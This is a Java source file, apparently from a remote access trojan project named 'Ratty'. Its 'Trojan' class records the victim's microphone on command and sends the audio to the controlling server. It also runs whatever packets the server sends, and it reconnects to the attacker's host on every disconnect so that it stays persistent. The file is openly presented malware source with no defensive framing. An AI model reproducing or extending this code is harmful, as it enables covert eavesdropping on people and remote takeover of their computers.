package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.VoicePacket;

public final class Trojan implements IConnectionObserver {
	
	private VoiceRecorder voiceRecorder;
	private byte[] lastData;
	
	private static final int MICROPHONE_BUFFER_SIZE = 1024 << 6;
	
	public Trojan() {
		voiceRecorder = new VoiceRecorder(MICROPHONE_BUFFER_SIZE);
		lastData = new byte[0];
		
		voiceRecorder.addListener((source, data) -> {
			lastData = data;
			source.start();
		});
	}
	
	@Override
	public void packetReceived(final ActiveConnection client, final IPacket packet) {
		if (packet instanceof VoicePacket) {
			final VoicePacket voice = (VoicePacket)packet;
			
			voiceRecorder.start();
			voice.setData(lastData);
		}
		
		packet.execute(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
